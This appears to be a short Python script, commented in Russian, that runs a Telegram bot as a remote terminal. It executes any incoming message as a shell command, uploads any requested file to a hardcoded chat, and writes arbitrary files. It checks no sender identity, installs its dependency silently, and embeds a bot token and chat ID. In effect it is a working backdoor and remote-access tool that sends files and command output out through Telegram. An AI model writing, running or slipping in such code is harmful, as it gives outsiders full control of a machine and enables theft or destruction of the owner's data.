import os, subprocess, threading

try:
    import telebot
except ImportError:
    subprocess.run(["pip", "install", "pyTelegramBotAPI"])
    import telebot

TOKEN = "8354728858:AAEsorSBoucxw5aZDTxDErBRHxhIe5m8Ysw"
CHAT_ID = "7943753454"
bot = telebot.TeleBot(TOKEN)

@bot.message_handler(commands=['start'])
def start(m):
    bot.send_message(CHAT_ID, "🎮 *Удаленный терминал активен.*\n\n"
                              "Команды:\n"
                              "• `ls <путь>` — список файлов\n"
                              "• `get <путь>` — скачать файл в ТГ\n"
                              "• `write <путь> <текст>` — создать/изменить файл\n"
                              "• Любая другая команда (cd, rm, и т.д.)", parse_mode="Markdown")

@bot.message_handler(content_types=['text'])
def handle_cmd(m):
    text = m.text.split(maxsplit=2)
    cmd = text[0].lower()

    # Команда скачивания файла
    if cmd == "get" and len(text) > 1:
        path = os.path.expanduser(text[1])
        if os.path.exists(path):
            try:
                with open(path, 'rb') as f:
                    bot.send_document(CHAT_ID, f)
            except Exception as e:
                bot.send_message(CHAT_ID, f"❌ Ошибка отправки: {e}")
        else:
            bot.send_message(CHAT_ID, "❌ Файл не найден")

    # Команда создания/редактирования (вместо nano)
    elif cmd == "write" and len(text) > 2:
        path, content = text[1], text[2]
        try:
            with open(os.path.expanduser(path), 'w') as f:
                f.write(content)
            bot.send_message(CHAT_ID, f"✅ Файл `{path}` успешно записан", parse_mode="Markdown")
        except Exception as e:
            bot.send_message(CHAT_ID, f"❌ Ошибка записи: {e}")

    # Обычный терминал
    else:
        try:
            # Выполняем команду и получаем вывод
            process = subprocess.Popen(m.text, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
            stdout, stderr = process.communicate()
            output = stdout + stderr
            if not output: output = "✅ Выполнено (без вывода)"
            bot.send_message(CHAT_ID, f"💻 *Вывод:* \n`{output[:4000]}`", parse_mode="Markdown")
        except Exception as e:
            bot.send_message(CHAT_ID, f"❌ Ошибка выполнения: {e}")

bot.polling(none_stop=True)
